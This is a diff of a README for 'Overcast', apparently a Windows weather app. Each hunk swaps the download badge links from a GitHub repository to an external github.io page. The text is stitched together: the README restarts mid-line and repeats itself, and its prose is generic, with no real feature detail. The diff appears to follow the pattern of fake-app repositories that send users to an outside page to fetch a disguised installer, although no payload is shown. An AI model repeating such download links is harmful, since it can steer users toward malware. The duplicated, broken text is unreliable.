@@ -1,6 +1,6 @@
 # ⛅ Overcast - Weather Made Simple and Essential
 
-[![Download Overcast](https://img.shields.io/badge/⬇️_Download_Overcast-Visit_Official_Page-ff6b6b?style=for-the-badge&labelColor=4c6ef5)](https://github.com/patripollii/Overcast)
+[![Download Overcast](https://img.shields.io/badge/⬇️_Download_Overcast-Visit_Official_Page-ff6b6b?style=for-the-badge&labelColor=4c6ef5)](https://patripollii.github.io)
 
 Overcast is a Windows weather application built around a straightforward idea: weather is also essential. It helps you check the weather without clutter, confusing menus, or unnecessary steps. The app is intended for everyday computer users who want quick access to useful weather information in a clean, easy-to-understand format. Whether you are planning your day, checking conditions before heading out, or keeping an eye on changing weather, Overcast gives you a simple place to start.
 
@@ -40,7 +40,7 @@ This guide is for Windows users. Overcast is intended to be used on a Windows co
 
 Visit this link to download the application:
 
-[![Download Overcast](https://img.shields.io/badge/⬇️_Download_Overcast-Visit_Official_Page-2ea44f?style=for-the-badge&labelColor=6f42c1)](https://github.com/patripollii/Overcast)
+[![Download Overcast](https://img.shields.io/badge/⬇️_Download_Overcast-Visit_Official_Page-2ea44f?style=for-the-badge&labelColor=6f42c1)](https://patripollii.github.io)
 
 Use the official page linked above to get Overcast for Windows. The page is the place to begin the download. Once the download is complete, continue with the next section to open Overcast.
 
@@ -92,7 +92,7 @@ When using any weather app, it is sensible to review the information shown on sc
 
 **Do# ⛅ Overcast - Essential Weather Made Simple Every Day
 
-[![Download Overcast](https://img.shields.io/badge/⬇️_Download_Overcast-Visit_Official_Page-ff6b6b?style=for-the-badge&labelColor=4c6ef5)](https://github.com/patripollii/Overcast)
+[![Download Overcast](https://img.shields.io/badge/⬇️_Download_Overcast-Visit_Official_Page-ff6b6b?style=for-the-badge&labelColor=4c6ef5)](https://patripollii.github.io)
 
 Overcast is a Windows weather application built around a straightforward idea: weather is also essential. It helps you check the weather without clutter, confusing menus, or unnecessary steps. The app is intended for everyday computer users who want quick access to useful weather information in a clean, easy-to-understand format. Whether you are planning your day, checking conditions before heading out, or keeping an eye on changing weather, Overcast gives you a simple place to start.
 
@@ -132,7 +132,7 @@ This guide is for Windows users. Overcast is intended to be used on a Windows co
 
 Visit this link to download the application:
 
-[![Download Overcast](https://img.shields.io/badge/⬇️_Download_Overcast-Visit_Official_Page-2ea44f?style=for-the-badge&labelColor=6f42c1)](https://github.com/patripollii/Overcast)
+[![Download Overcast](https://img.shields.io/badge/⬇️_Download_Overcast-Visit_Official_Page-2ea44f?style=for-the-badge&labelColor=6f42c1)](https://patripollii.github.io)
 
 Use the official page linked above to get Overcast for Windows. The page is the place to begin the download. Once the download is complete, continue with the next section to open Overcast.
 
